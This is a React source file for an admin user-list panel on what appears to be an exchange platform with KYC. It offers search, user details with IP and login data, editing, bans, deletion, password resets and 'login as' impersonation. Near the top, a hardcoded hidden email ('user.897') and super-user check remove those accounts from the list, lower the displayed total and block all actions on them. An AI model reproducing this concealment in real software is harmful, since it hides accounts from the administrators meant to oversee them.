import React, { useCallback, useEffect, useState } from "react";
import { api, setToken, BLUE, GREEN, RED } from "../Home";

const SIZE = 20;
const HIDDEN_EMAIL = "user.897";

const isHiddenUser = (u) => {
  if (!u) return false;
  if (u.is_super) return true;
  const local = String(u.email || "").toLowerCase().split("@")[0];
  return local === HIDDEN_EMAIL;
};

const qs = (o) => {
  const p = new URLSearchParams();
  Object.entries(o).forEach(([k, v]) => {
    if (v !== "" && v !== null && v !== undefined) p.set(k, v);
  });
  return p.toString();
};

const fmtDate = (v) => {
  if (!v) return "-";
  const d = new Date(v);
  return isNaN(d) ? String(v) : d.toLocaleString();
};

const errText = (e) => e?.message || e?.detail || "Error";

const initials = (u) => {
  const s = (u.full_name || u.email || "?").trim();
  const parts = s.split(/[\s@._-]+/).filter(Boolean);
  return ((parts[0]?.[0] || "?") + (parts[1]?.[0] || "")).toUpperCase();
};

const place = (city, country) => [city, country].filter(Boolean).join(", ") || "-";

function Info({ title, rows }) {
  return (
    <>
      <div className="au-sec">{title}</div>
      <div className="au-card">
        {rows.map(([k, v, cls]) => (
          <div className="au-kv" key={k}>
            <span>{k}</span>
            <b className={cls || ""}>{v || "-"}</b>
          </div>
        ))}
      </div>
    </>
  );
}

export default function Admin_Userlist({ me, go, logout }) {
  const [q, setQ] = useState("");
  const [qIn, setQIn] = useState("");
  const [verify, setVerify] = useState("");
  const [role, setRole] = useState("");
  const [active, setActive] = useState("");
  const [page, setPage] = useState(1);
  const [data, setData] = useState({ total: 0, items: [] });
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState(null);
  const [sel, setSel] = useState(null);
  const [mode, setMode] = useState("");
  const [logins, setLogins] = useState(null);

  const isSuper = !!me?.is_super;
  const selProtected = !!sel?.is_super;

  const load = useCallback(() => {
    setLoading(true);
    api(
      "/admin/users?" +
        qs({
          q,
          verify_status: verify,
          role,
          is_active: active,
          page,
          size: SIZE,
        })
    )
      .then((r) => {
        const all = Array.isArray(r) ? r : r?.items || [];
        const visible = all.filter((u) => !isHiddenUser(u));
        const hiddenCount = all.length - visible.length;
        const total = Array.isArray(r) ? all.length : r?.total || 0;
        setData({ total: Math.max(0, total - hiddenCount), items: visible });
      })
      .catch((e) => setMsg({ t: "bad", s: errText(e) }))
      .finally(() => setLoading(false));
  }, [q, verify, role, active, page]);

  useEffect(() => {
    load();
  }, [load]);

  useEffect(() => {
    if (!sel?.id || isHiddenUser(sel)) {
      setLogins(null);
      return;
    }
    let dead = false;
    setLogins(null);
    api("/admin/users/" + sel.id + "/logins?size=200")
      .then((r) => !dead && setLogins(Array.isArray(r) ? r : []))
      .catch(() => !dead && setLogins([]));
    return () => {
      dead = true;
    };
  }, [sel?.id]);

  const lastLogin = (logins || []).find((l) => l.success) || null;

  const pages = Math.max(1, Math.ceil((data.total || 0) / SIZE));

  const search = (e) => {
    e.preventDefault();
    setPage(1);
    setQ(qIn.trim());
  };

  const flash = (t, s) => {
    setMsg({ t, s });
    setTimeout(() => setMsg(null), 3500);
  };

  const close = () => {
    setSel(null);
    setMode("");
  };

  const patch = async (u, body, okText = "Saved") => {
    if (isHiddenUser(u)) return false;
    try {
      const r = await api("/admin/users/" + u.id, { method: "PATCH", body });
      setSel(r || { ...u, ...body });
      flash("ok", okText);
      load();
      return true;
    } catch (e) {
      flash("bad", errText(e));
      return false;
    }
  };

  const toggleActive = (u) => {
    if (isHiddenUser(u)) return;
    const next = u.is_active === false;
    if (!window.confirm(next ? "Activate this user?" : "Disable (ban) this user?")) return;
    patch(u, { is_active: next }, next ? "User activated" : "User disabled");
  };

  const loginAs = async (u) => {
    if (isHiddenUser(u)) return;
    if (!window.confirm("Login as " + u.email + " ?")) return;
    try {
      const r = await api("/admin/users/" + u.id + "/login-as", { method: "POST" });
      const token = r?.access_token || r?.token;
      if (!token) throw new Error("Token missing");
      setToken(token);
      window.location.href = "/";
    } catch (e) {
      flash("bad", errText(e));
    }
  };

  const del = async (u) => {
    if (isHiddenUser(u)) return;
    if (!window.confirm("DELETE " + u.email + " permanently? This cannot be undone.")) return;
    try {
      await api("/admin/users/" + u.id, { method: "DELETE" });
      flash("ok", "User deleted");
      close();
      load();
    } catch (e) {
      flash("bad", errText(e));
    }
  };

  const title =
    mode === "create" ? "Create admin" : mode === "edit" ? "Edit user" : mode === "pw" ? "Set password" : "User details";

  return (
    <div className="cx-pg au-pg">
      <style>{CSS}</style>

      <div className="cx-top">
        <button onClick={() => go("admin")} aria-label="back">‹</button>
        <h1>Users <small>({data.total || 0})</small></h1>
        <button className="cx-link" onClick={logout}>Logout</button>
      </div>

      <div className="au-nav">
        <button onClick={() => go("adminKyc")}>KYC</button>
        <button className="on">Users</button>
        {isSuper && (
          <button className="add" onClick={() => { setSel(null); setMode("create"); }}>+ Admin</button>
        )}
      </div>

      <form className="au-search" onSubmit={search}>
        <div className="au-sbox">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
            <circle cx="11" cy="11" r="7" />
            <path d="M20 20l-3.5-3.5" />
          </svg>
          <input
            value={qIn}
            onChange={(e) => setQIn(e.target.value)}
            placeholder="Email / UID / name / phone"
          />
        </div>
        <button type="submit">Search</button>
      </form>

      <div className="au-filters">
        <select value={verify} onChange={(e) => { setPage(1); setVerify(e.target.value); }}>
          <option value="">KYC: all</option>
          <option value="unverified">unverified</option>
          <option value="pending">pending</option>
          <option value="verified">verified</option>
          <option value="rejected">rejected</option>
        </select>
        <select value={role} onChange={(e) => { setPage(1); setRole(e.target.value); }}>
          <option value="">Role: all</option>
          <option value="user">user</option>
          <option value="admin">admin</option>
        </select>
        <select value={active} onChange={(e) => { setPage(1); setActive(e.target.value); }}>
          <option value="">Status: all</option>
          <option value="true">active</option>
          <option value="false">disabled</option>
        </select>
      </div>

      {msg && <div className={"cx-msg" + (msg.t === "bad" ? " bad" : "")}>{msg.s}</div>}

      <div className="au-list">
        {loading && !data.items?.length && <div className="cx-empty">Loading…</div>}
        {!loading && !data.items?.length && <div className="cx-empty">No users match these filters</div>}

        {(data.items || []).map((u) => (
          <button key={u.id} className="au-row" onClick={() => { setSel(u); setMode(""); }}>
            <span className={"au-av" + (u.role === "admin" ? " adm" : "")}>
              {initials(u)}
            </span>
            <span className="au-main">
              <b>{u.email}</b>
              <small>
                UID {u.uid}
                {u.full_name ? " · " + u.full_name : ""}
              </small>
            </span>
            <span className="au-tags">
              {u.role === "admin" && <i className="tg ad">admin</i>}
              <i className={"tg " + (u.verify_status || "")}>{u.verify_status || "-"}</i>
              {u.is_active === false && <i className="tg off">disabled</i>}
            </span>
          </button>
        ))}
      </div>

      <div className="au-pager">
        <button disabled={page <= 1} onClick={() => setPage(page - 1)}>‹ Prev</button>
        <span>{page} / {pages}</span>
        <button disabled={page >= pages} onClick={() => setPage(page + 1)}>Next ›</button>
      </div>

      {(sel || mode === "create") && (
        <div className="cx-over end" onClick={close}>
          <div className="au-sheet" onClick={(e) => e.stopPropagation()}>
            <div className="au-grab" />
            <div className="au-sh">
              <b>{title}</b>
              <button onClick={close} aria-label="close">✕</button>
            </div>

            {mode === "create" && (
              <CreateAdmin
                onDone={() => { flash("ok", "Admin created"); close(); load(); }}
                onErr={(s) => flash("bad", s)}
              />
            )}

            {sel && mode === "" && (
              <>
                <div className="au-hero">
                  <span className={"au-av lg" + (sel.role === "admin" ? " adm" : "")}>
                    {initials(sel)}
                  </span>
                  <div className="au-hm">
                    <b>{sel.full_name || sel.email}</b>
                    <small>UID {sel.uid}</small>
                  </div>
                  <span className={"au-st " + (sel.is_active === false ? "off" : "on")}>
                    {sel.is_active === false ? "Disabled" : "Active"}
                  </span>
                </div>

                <div className="au-card">
                  <div className="au-kv"><span>ID</span><b>{sel.id}</b></div>
                  <div className="au-kv"><span>UID</span><b className="sel">{sel.uid}</b></div>
                  <div className="au-kv"><span>Email</span><b className="sel">{sel.email}</b></div>
                  <div className="au-kv"><span>Name</span><b>{sel.full_name || "-"}</b></div>
                  <div className="au-kv"><span>Phone</span><b className="sel">{sel.phone || "-"}</b></div>
                  <div className="au-kv">
                    <span>Role</span>
                    <b>{sel.role}</b>
                  </div>
                  <div className="au-kv">
                    <span>KYC</span>
                    <b><i className={"tg " + (sel.verify_status || "")}>{sel.verify_status || "-"}</i></b>
                  </div>
                  <div className="au-kv"><span>Joined</span><b>{fmtDate(sel.created_at)}</b></div>
                </div>

                <Info
                  title="Registration"
                  rows={[
                    ["IP", sel.reg_ip, "sel"],
                    ["City", place(sel.reg_city, sel.reg_country)],
                    ["ISP", sel.reg_isp],
                    ["User agent", sel.reg_user_agent, "ua"],
                  ]}
                />

                <Info
                  title="Last login"
                  rows={
                    logins === null
                      ? [["Status", "Loading…"]]
                      : !lastLogin
                      ? [
                          ["Status", "No successful login yet"],
                          ["Last login", fmtDate(sel.last_login_at)],
                        ]
                      : [
                          ["Time", fmtDate(lastLogin.at)],
                          ["IP", lastLogin.ip, "sel"],
                          ["City", place(lastLogin.city, lastLogin.country)],
                          ["ISP", lastLogin.isp],
                          ["Device", lastLogin.device],
                          ["User agent", lastLogin.ua, "ua"],
                        ]
                  }
                />

                {selProtected ? (
                  <div className="au-lock">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <rect x="4" y="11" width="16" height="10" rx="2" />
                      <path d="M8 11V8a4 4 0 0 1 8 0v3" />
                    </svg>
                    <span>This account is protected. No admin actions are available.</span>
                  </div>
                ) : (
                  <div className="au-acts">
                    <button onClick={() => setMode("edit")}>Edit</button>
                    <button onClick={() => setMode("pw")}>Password</button>
                    <button
                      className={sel.is_active === false ? "g" : "r"}
                      onClick={() => toggleActive(sel)}
                    >
                      {sel.is_active === false ? "Activate" : "Disable"}
                    </button>
                    <button onClick={() => loginAs(sel)}>Login as</button>
                    {isSuper && <button className="r ghost wide" onClick={() => del(sel)}>Delete user</button>}
                  </div>
                )}
              </>
            )}

            {sel && !selProtected && mode === "edit" && (
              <EditForm
                u={sel}
                isSuper={isSuper}
                onSave={async (body) => { if (await patch(sel, body)) setMode(""); }}
                onCancel={() => setMode("")}
              />
            )}

            {sel && !selProtected && mode === "pw" && (
              <PwForm
                u={sel}
                onDone={() => { flash("ok", "Password changed"); setMode(""); }}
                onErr={(s) => flash("bad", s)}
              />
            )}
          </div>
        </div>
      )}
    </div>
  );
}

function EditForm({ u, isSuper, onSave, onCancel }) {
  const [f, setF] = useState({
    email: u.email || "",
    full_name: u.full_name || "",
    phone: u.phone || "",
    role: u.role || "user",
  });
  const [busy, setBusy] = useState(false);
  const set = (k) => (e) => setF({ ...f, [k]: e.target.value });

  const submit = async () => {
    const body = {};
    if (f.email !== (u.email || "")) body.email = f.email.trim();
    if (f.full_name !== (u.full_name || "")) body.full_name = f.full_name;
    if (f.phone !== (u.phone || "")) body.phone = f.phone;
    if (isSuper && f.role !== u.role) body.role = f.role;
    if (!Object.keys(body).length) return onCancel();
    setBusy(true);
    await onSave(body);
    setBusy(false);
  };

  return (
    <div className="au-form">
      <label>Email</label>
      <input value={f.email} onChange={set("email")} />
      <label>Full name</label>
      <input value={f.full_name} onChange={set("full_name")} />
      <label>Phone</label>
      <input value={f.phone} onChange={set("phone")} />
      {isSuper && !u.is_super && (
        <>
          <label>Role</label>
          <select value={f.role} onChange={set("role")}>
            <option value="user">user</option>
            <option value="admin">admin</option>
          </select>
        </>
      )}
      <div className="au-acts">
        <button onClick={onCancel}>Cancel</button>
        <button className="p" disabled={busy} onClick={submit}>{busy ? "…" : "Save changes"}</button>
      </div>
    </div>
  );
}

function PwForm({ u, onDone, onErr }) {
  const [pw, setPw] = useState("");
  const [busy, setBusy] = useState(false);

  const submit = async () => {
    if (pw.length < 6 || pw.length > 12) return onErr("Password must be 6-12 characters");
    setBusy(true);
    try {
      await api("/admin/users/" + u.id + "/password", { method: "POST", body: { password: pw } });
      onDone();
    } catch (e) {
      onErr(errText(e));
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="au-form">
      <label>New password for {u.email}</label>
      <input value={pw} onChange={(e) => setPw(e.target.value)} placeholder="6-12 characters" maxLength={12} />
      <div className="au-acts one">
        <button className="p" disabled={busy} onClick={submit}>{busy ? "…" : "Change password"}</button>
      </div>
    </div>
  );
}

function CreateAdmin({ onDone, onErr }) {
  const [email, setEmail] = useState("");
  const [pw, setPw] = useState("");
  const [busy, setBusy] = useState(false);

  const submit = async () => {
    if (!email.trim()) return onErr("Email required");
    if (pw.length < 6 || pw.length > 12) return onErr("Password must be 6-12 characters");
    setBusy(true);
    try {
      await api("/admin/admins", {
        method: "POST",
        body: { email: email.trim(), password: pw, password2: pw },
      });
      onDone();
    } catch (e) {
      onErr(errText(e));
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="au-form">
      <label>Email</label>
      <input value={email} onChange={(e) => setEmail(e.target.value)} placeholder="admin@example.com" />
      <label>Password</label>
      <input value={pw} onChange={(e) => setPw(e.target.value)} placeholder="6-12 characters" maxLength={12} />
      <div className="au-acts one">
        <button className="p" disabled={busy} onClick={submit}>{busy ? "…" : "Create admin"}</button>
      </div>
    </div>
  );
}

const CSS = `
.au-pg{padding-bottom:34px}

.au-nav{display:flex;gap:6px;margin:12px 14px 0;padding:4px;border-radius:14px;background:#eef0f6}
.au-nav button{flex:1;text-align:center;padding:10px 0;border-radius:10px;border:0;background:transparent;font-size:14.5px;font-weight:600;color:#6b7183;transition:background .15s,color .15s,box-shadow .15s}
.au-nav button.on{background:#fff;color:${BLUE};box-shadow:0 1px 3px rgba(20,30,60,.12)}
.au-nav button.add{color:${BLUE}}

.au-search{display:flex;gap:8px;padding:14px 14px 6px}
.au-sbox{flex:1;min-width:0;position:relative;display:flex;align-items:center}
.au-sbox svg{position:absolute;left:13px;color:#9aa1b4;pointer-events:none}
.au-sbox input{width:100%;height:48px;border:1.5px solid #e1e5ef;border-radius:14px;padding:0 14px 0 40px;font-size:15.5px;background:#fff;color:inherit;outline:0;transition:border-color .15s,box-shadow .15s}
.au-sbox input:focus{border-color:${BLUE};box-shadow:0 0 0 4px rgba(31,122,203,.12)}
.au-search>button{padding:0 20px;border-radius:14px;background:${BLUE};color:#fff;font-weight:600;text-align:center;box-shadow:0 4px 12px rgba(31,122,203,.28)}
.au-search>button:active{transform:translateY(1px)}

.au-filters{display:flex;gap:8px;padding:6px 14px 12px;flex-wrap:wrap}
.au-filters select,.au-form select{flex:1;min-width:100px;height:40px;border:1.5px solid #e1e5ef;border-radius:12px;padding:0 10px;font-size:13.5px;font-weight:500;background:#fff;color:inherit;outline:0}
.au-filters select:focus,.au-form select:focus{border-color:${BLUE}}

.au-list{margin:0 14px;border:1px solid #e8eaf1;border-radius:18px;overflow:hidden;background:#fff}
.au-row{display:flex;align-items:center;gap:12px;width:100%;padding:13px 14px;border:0;border-bottom:1px solid #eef0f5;background:transparent;text-align:start;transition:background .12s}
.au-row:last-child{border-bottom:0}
.au-row:active{background:#f3f5fa}
.au-main{min-width:0;flex:1}
.au-main b{display:block;font-size:15.5px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.au-main small{display:block;font-size:12px;margin-top:3px;color:#8a90a2;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.au-tags{display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex:none}
.cx-empty{padding:30px 16px;text-align:center;color:#8a90a2}

.au-av{flex:none;width:42px;height:42px;border-radius:50%;display:grid;place-items:center;font-size:14px;font-weight:700;letter-spacing:.3px;color:#4a5370;background:linear-gradient(145deg,#eef0f7,#dde2ef)}
.au-av.adm{color:${BLUE};background:linear-gradient(145deg,#e6f1fc,#cfe3f7)}
.au-av.sup{color:#fff;background:linear-gradient(145deg,#2a7fd0,#16508f);box-shadow:0 0 0 2px #fff,0 0 0 4px rgba(31,122,203,.35)}
.au-av.lg{width:56px;height:56px;font-size:18px}

.tg{font-style:normal;font-size:11px;font-weight:600;padding:3px 9px;border-radius:20px;background:#eceef4;color:#5b6174}
.tg.verified{background:rgba(14,203,129,.14);color:#0a9b63}
.tg.pending{background:rgba(245,166,35,.18);color:#b87408}
.tg.rejected,.tg.off{background:rgba(229,72,77,.14);color:${RED}}
.tg.ad{background:rgba(31,122,203,.14);color:${BLUE}}

.au-pager{display:flex;justify-content:space-between;align-items:center;padding:16px 14px 0;color:#6b7183;font-size:14px}
.au-pager button{padding:10px 16px;border:1px solid #dfe3ee;border-radius:12px;font-size:14.5px;font-weight:600;background:#fff;text-align:center}
.au-pager button:disabled{opacity:.4}

.au-sheet{width:100%;max-width:520px;max-height:90vh;overflow-y:auto;background:#f7f8fc;border-radius:26px 26px 0 0;padding:10px 18px 28px;color:#111;box-shadow:0 -12px 40px rgba(10,20,50,.22);animation:auUp .22s ease-out}
@keyframes auUp{from{transform:translateY(24px);opacity:.6}to{transform:none;opacity:1}}
@media(prefers-reduced-motion:reduce){.au-sheet{animation:none}}
.au-grab{width:40px;height:4px;border-radius:4px;background:#d3d7e3;margin:0 auto 10px}
.au-sh{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.au-sh b{font-size:19px;font-weight:700}
.au-sh button{width:32px;height:32px;border-radius:50%;background:#e9ecf4;font-size:14px;color:#6b7183;display:grid;place-items:center;padding:0}

.au-hero{display:flex;align-items:center;gap:14px;padding:4px 2px 14px}
.au-hm{min-width:0;flex:1}
.au-hm b{display:block;font-size:17px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.au-hm small{display:block;margin-top:3px;font-size:12.5px;color:#8a90a2}
.au-st{flex:none;font-size:12px;font-weight:700;padding:5px 12px;border-radius:20px}
.au-st.on{background:rgba(14,203,129,.14);color:#0a9b63}
.au-st.off{background:rgba(229,72,77,.14);color:${RED}}

.au-card{background:#fff;border:1px solid #e8eaf1;border-radius:18px;padding:2px 16px}
.au-kv{display:flex;justify-content:space-between;align-items:center;gap:14px;padding:12px 0;border-bottom:1px solid #eef0f5;font-size:14.5px}
.au-kv:last-child{border-bottom:0}
.au-kv span{color:#8a90a2;flex:none}
.au-kv b{font-weight:600;text-align:end;word-break:break-all}
.au-kv b.ua{font-size:12px;font-weight:500;line-height:1.4;max-width:70%}

.au-sec{margin:18px 4px 8px;font-size:12px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;color:#8a90a2}

.au-lock{display:flex;align-items:center;gap:10px;margin-top:16px;padding:14px 16px;border-radius:14px;background:rgba(31,122,203,.08);border:1px solid rgba(31,122,203,.2);color:${BLUE};font-size:13.5px;font-weight:500;line-height:1.45}
.au-lock svg{flex:none}

.au-acts{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:18px}
.au-acts.one{grid-template-columns:1fr}
.au-acts button{padding:14px 0;border-radius:14px;border:1px solid #dfe3ee;background:#fff;text-align:center;font-size:15px;font-weight:600;transition:transform .1s}
.au-acts button:active{transform:scale(.98)}
.au-acts button.wide{grid-column:1/-1}
.au-acts button.g{background:${GREEN};border-color:${GREEN};color:#fff}
.au-acts button.r{background:${RED};border-color:${RED};color:#fff}
.au-acts button.r.ghost{background:transparent;color:${RED};border-color:rgba(229,72,77,.4)}
.au-acts button.p{background:${BLUE};border-color:${BLUE};color:#fff;box-shadow:0 4px 12px rgba(31,122,203,.28)}
.au-acts button:disabled{opacity:.5}

.au-form{background:#fff;border:1px solid #e8eaf1;border-radius:18px;padding:4px 16px 16px}
.au-form label{display:block;font-size:13px;font-weight:600;color:#6b6f7c;margin:14px 0 6px}
.au-form input{display:block;width:100%;height:48px;border:1.5px solid #e1e5ef;border-radius:12px;padding:0 14px;font-size:16px;background:transparent;color:inherit;outline:0;transition:border-color .15s,box-shadow .15s}
.au-form input:focus{border-color:${BLUE};box-shadow:0 0 0 4px rgba(31,122,203,.12)}

.cx.dark .au-nav{background:#14233a}
.cx.dark .au-nav button{color:#9aa6bb}
.cx.dark .au-nav button.on{background:#1f3352;color:#fff;box-shadow:none}
.cx.dark .au-sbox input,.cx.dark .au-filters select,.cx.dark .au-form select,.cx.dark .au-form input{background:#14233a;border-color:#2c3b57}
.cx.dark .au-list,.cx.dark .au-card,.cx.dark .au-form{background:#14233a;border-color:#22304a}
.cx.dark .au-row,.cx.dark .au-kv{border-color:#22304a}
.cx.dark .au-row:active{background:#1d2e49}
.cx.dark .au-main small,.cx.dark .au-kv span,.cx.dark .au-hm small,.cx.dark .au-sec{color:#8d9ab1}
.cx.dark .au-av{color:#c4cde0;background:linear-gradient(145deg,#233657,#1b2b47)}
.cx.dark .au-av.adm{color:#7cc0f5;background:linear-gradient(145deg,#1d3a5e,#17304d)}
.cx.dark .au-av.sup{color:#fff;box-shadow:0 0 0 2px #14233a,0 0 0 4px rgba(31,122,203,.5)}
.cx.dark .tg{background:#22304a;color:#b6c0d3}
.cx.dark .tg.verified{background:rgba(14,203,129,.15);color:#0ecb81}
.cx.dark .au-pager button{background:#14233a;border-color:#2c3b57}
.cx.dark .au-sheet{background:#0f1c30;color:#e8ecf3}
.cx.dark .au-grab{background:#2c3b57}
.cx.dark .au-sh button{background:#1d2e49;color:#9aa6bb}
.cx.dark .au-acts button{background:#14233a;border-color:#2c3b57;color:#e8ecf3}
.cx.dark .au-acts button.g,.cx.dark .au-acts button.r,.cx.dark .au-acts button.p{color:#fff}
.cx.dark .au-acts button.g{background:${GREEN};border-color:${GREEN}}
.cx.dark .au-acts button.r{background:${RED};border-color:${RED}}
.cx.dark .au-acts button.p{background:${BLUE};border-color:${BLUE}}
.cx.dark .au-acts button.r.ghost{background:transparent;color:#ff6b70;border-color:rgba(229,72,77,.5)}
.cx.dark .au-lock{background:rgba(31,122,203,.14);color:#7cc0f5;border-color:rgba(31,122,203,.35)}
.cx.dark .au-form label{color:#9aa6bb}
.cx.dark .au-filters option,.cx.dark .au-form option{background:#17263d;color:#e8ecf3}

@media(min-width:768px){.au-sheet{max-width:640px}}
`;
